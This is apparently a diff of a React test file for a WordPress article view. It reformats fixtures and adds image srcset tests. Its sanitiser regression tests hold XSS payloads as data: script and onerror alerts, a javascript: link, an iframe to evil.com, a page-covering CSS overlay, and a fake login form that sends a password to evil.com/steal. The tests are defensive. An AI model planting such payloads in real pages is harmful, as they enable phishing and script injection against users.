@@ -53,16 +53,9 @@ describe("ArticleView", () => {
   });
 
   it("renders original article link when post.link is present (regression #155)", () => {
-    const linkedPost: WpPost = {
-      ...fullPost,
-      link: "https://example.com/original-article",
-    };
-
+    const linkedPost: WpPost = { ...fullPost, link: "https://example.com/original-article" };
     render(withProviders(<ArticleView post={linkedPost} onBack={vi.fn()} />));
-
-    const originalLink = screen.getByRole("link", {
-      name: /查看原始文章.*於新分頁開啟/,
-    });
+    const originalLink = screen.getByRole("link", { name: /\u67E5\u770B\u539F\u59CB\u6587\u7AE0.*\u65BC\u65B0\u5206\u9801\u958B\u555F/ });
     expect(originalLink).toBeInTheDocument();
     expect(originalLink).toHaveAttribute("href", "https://example.com/original-article");
     expect(originalLink).toHaveAttribute("target", "_blank");
@@ -71,24 +64,19 @@ describe("ArticleView", () => {
 
   it("does not render original article link when post.link is absent (regression #155)", () => {
     render(withProviders(<ArticleView post={fullPost} onBack={vi.fn()} />));
-    expect(screen.queryByRole("link", { name: /查看原始文章/ })).not.toBeInTheDocument();
+    expect(screen.queryByRole("link", { name: /\u67E5\u770B\u539F\u59CB\u6587\u7AE0/ })).not.toBeInTheDocument();
   });
 
   it("does not render original article link for unsafe schemes (regression #155)", () => {
-    const unsafeLinkPost: WpPost = {
-      ...fullPost,
-      link: "javascript:alert(1)",
-    };
-
+    const unsafeLinkPost: WpPost = { ...fullPost, link: "javascript:alert(1)" };
     render(withProviders(<ArticleView post={unsafeLinkPost} onBack={vi.fn()} />));
-
-    expect(screen.queryByRole("link", { name: /查看原始文章/ })).not.toBeInTheDocument();
+    expect(screen.queryByRole("link", { name: /\u67E5\u770B\u539F\u59CB\u6587\u7AE0/ })).not.toBeInTheDocument();
   });
 
   it("renders back button and calls onBack", () => {
     const handler = vi.fn();
     render(withProviders(<ArticleView post={handler} onBack={handler} />));
-    const btn = screen.getByText(/\u8fd4\u56de\u5217\u8868/);
+    const btn = screen.getByText(/\u8FD4\u56DE\u5217\u8868/);
     expect(btn).toBeInTheDocument();
     fireEvent.click(btn);
     expect(handler).toHaveBeenCalledOnce();
@@ -120,11 +108,7 @@ describe("ArticleView", () => {
   });
 
   it("sanitizes malicious HTML content (XSS regression #41)", () => {
-    const xssPost: WpPost = {
-      id: 99,
-      title: "XSS Test",
-      content: '<p>Safe content</p><script>alert("xss")</script><img src=x onerror=alert(1)><iframe src="https://evil.com"></iframe>',
-    };
+    const xssPost: WpPost = { id: 99, title: "XSS Test", content: '<p>Safe content</p><script>alert("xss")</script><img src=x onerror=alert(1)><iframe src="https://evil.com"></iframe>' };
     const { container } = render(withProviders(<ArticleView post={xssPost} onBack={vi.fn()} />));
     const articleBody = container.querySelector(".article-body");
     expect(articleBody).toBeInTheDocument();
@@ -135,11 +119,7 @@ describe("ArticleView", () => {
   });
 
   it("strips event handlers from WordPress HTML (XSS regression #41)", () => {
-    const eventPost: WpPost = {
-      id: 100,
-      title: "Event Handler XSS",
-      content: '<div onmouseover="steal()">Hover me</div><a href="javascript:void(0)">Click</a><p>Normal paragraph</p>',
-    };
+    const eventPost: WpPost = { id: 100, title: "Event Handler XSS", content: '<div onmouseover="steal()">Hover me</div><a href="javascript:void(0)">Click</a><p>Normal paragraph</p>' };
     const { container } = render(withProviders(<ArticleView post={eventPost} onBack={vi.fn()} />));
     const articleBody = container.querySelector(".article-body");
     expect(articleBody).toBeInTheDocument();
@@ -149,24 +129,14 @@ describe("ArticleView", () => {
   });
 
   it("decodes HTML entities in title (regression #83)", () => {
-    const entityPost: WpPost = {
-      id: 101,
-      title: "Q&amp;A Column &lt;Special&gt; &#8217;Quotes&#8217;",
-    };
+    const entityPost: WpPost = { id: 101, title: "Q&amp;A Column &lt;Special&gt; &#8217;Quotes&#8217;" };
     render(withProviders(<ArticleView post={entityPost} onBack={vi.fn()} />));
     const h1 = screen.getByRole("heading", { level: 1 });
     expect(h1.textContent).toBe("Q&A Column <Special> \u2019Quotes\u2019");
   });
 
   it("uses post title as alt fallback when alt_text is missing (regression #118)", () => {
-    const noAltPost: WpPost = {
-      id: 102,
-      title: "Fallback Alt Article",
-      content: "<p>Some content</p>",
-      _embedded: {
-        "wp:featuredmedia": [{ source_url: "https://example.com/no-alt.jpg" }],
-      },
-    };
+    const noAltPost: WpPost = { id: 102, title: "Fallback Alt Article", content: "<p>Some content</p>", _embedded: { "wp:featuredmedia": [{ source_url: "https://example.com/no-alt.jpg" }] } };
     const { container } = render(withProviders(<ArticleView post={noAltPost} onBack={vi.fn()} />));
     const img = container.querySelector("img");
     expect(img).toBeInTheDocument();
@@ -181,11 +151,7 @@ describe("ArticleView", () => {
   });
 
   it("strips style tags and style attributes from content (regression #211)", () => {
-    const cssInjectionPost: WpPost = {
-      id: 211,
-      title: "CSS Injection Test",
-      content: '<style>body{display:none}</style><p style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999">overlay</p><p>Safe paragraph</p>',
-    };
+    const cssInjectionPost: WpPost = { id: 211, title: "CSS Injection Test", content: '<style>body{display:none}</style><p style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999">overlay</p><p>Safe paragraph</p>' };
     const { container } = render(withProviders(<ArticleView post={cssInjectionPost} onBack={vi.fn()} />));
     const articleBody = container.querySelector(".article-body");
     expect(articleBody).toBeInTheDocument();
@@ -195,11 +161,7 @@ describe("ArticleView", () => {
   });
 
   it("strips form and input tags from content (regression #211)", () => {
-    const formSpoofPost: WpPost = {
-      id: 212,
-      title: "Form Spoofing Test",
-      content: '<form action="https://evil.com/steal"><input type="text" name="password" placeholder="Enter password"><button type="submit">Login</button><select><option>A</option></select><textarea>notes</textarea><fieldset><legend>Info</legend></fieldset></form><p>Safe paragraph</p>',
-    };
+    const formSpoofPost: WpPost = { id: 212, title: "Form Spoofing Test", content: '<form action="https://evil.com/steal"><input type="text" name="password" placeholder="Enter password"><button type="submit">Login</button><select><option>A</option></select><textarea>notes</textarea><fieldset><legend>Info</legend></fieldset></form><p>Safe paragraph</p>' };
     const { container } = render(withProviders(<ArticleView post={formSpoofPost} onBack={vi.fn()} />));
     const articleBody = container.querySelector(".article-body");
     expect(articleBody).toBeInTheDocument();
@@ -222,15 +184,15 @@ describe("ArticleView", () => {
 
   it("renders share buttons section at bottom of article (regression #424)", () => {
     render(withProviders(<ArticleView post={fullPost} onBack={vi.fn()} />));
-    expect(screen.getByText(/\u5206\u4eab\u9019\u7bc7\u6587\u7ae0/)).toBeInTheDocument();
-    expect(screen.getByText(/\u8907\u88fd\u9023\u7d50/)).toBeInTheDocument();
+    expect(screen.getByText(/\u5206\u4EAB\u9019\u7BC7\u6587\u7AE0/)).toBeInTheDocument();
+    expect(screen.getByText(/\u8907\u88FD\u9023\u7D50/)).toBeInTheDocument();
   });
 
   it("copy link button writes URL to clipboard (regression #424)", async () => {
     const writeText = vi.fn().mockResolvedValue(undefined);
     Object.assign(navigator, { clipboard: { writeText } });
     render(withProviders(<ArticleView post={fullPost} onBack={vi.fn()} />));
-    const copyBtn = screen.getByText(/\u8907\u88fd\u9023\u7d50/);
+    const copyBtn = screen.getByText(/\u8907\u88FD\u9023\u7D50/);
     fireEvent.click(copyBtn);
     expect(writeText).toHaveBeenCalledOnce();
   });
@@ -242,5 +204,27 @@ describe("ArticleView", () => {
     expect(hrefs.some((h) => h.includes("facebook.com/sharer"))).toBe(true);
     expect(hrefs.some((h) => h.includes("twitter.com/intent/tweet"))).toBe(true);
     expect(hrefs.some((h) => h.includes("line.me/lineit/share"))).toBe(true);
+  });
+
+  it("renders width/height from media_details (regression #580)", () => {
+    const sizedPost: WpPost = { id: 200, title: "Sized Article", content: "<p>Content</p>", _embedded: { "wp:featuredmedia": [{ source_url: "https://example.com/hero.jpg", alt_text: "Hero", media_details: { width: 1600, height: 900 } }] } };
+    const { container } = render(withProviders(<ArticleView post={sizedPost} onBack={vi.fn()} />));
+    const img = container.querySelector("img");
+    expect(img).toBeInTheDocument();
+    expect(img).toHaveAttribute("width", "1600");
+    expect(img).toHaveAttribute("height", "900");
+  });
+
+  it("renders srcset from media_details.sizes (regression #580)", () => {
+    const responsivePost: WpPost = { id: 201, title: "Responsive Article", content: "<p>Content</p>", _embedded: { "wp:featuredmedia": [{ source_url: "https://example.com/full.jpg", alt_text: "Responsive", media_details: { width: 1920, height: 1080, sizes: { thumbnail: { source_url: "https://example.com/thumb.jpg", width: 150, height: 84 }, medium: { source_url: "https://example.com/med.jpg", width: 300, height: 169 }, large: { source_url: "https://example.com/lrg.jpg", width: 1024, height: 576 } } } }] } };
+    const { container } = render(withProviders(<ArticleView post={responsivePost} onBack={vi.fn()} />));
+    const img = container.querySelector("img");
+    expect(img).toBeInTheDocument();
+    expect(img).toHaveAttribute("srcset");
+    const srcset = img!.getAttribute("srcset")!;
+    expect(srcset).toContain("thumb.jpg 150w");
+    expect(srcset).toContain("med.jpg 300w");
+    expect(srcset).toContain("lrg.jpg 1024w");
+    expect(img).toHaveAttribute("sizes", "(min-width: 768px) 72ch, 100vw");
   });
 });
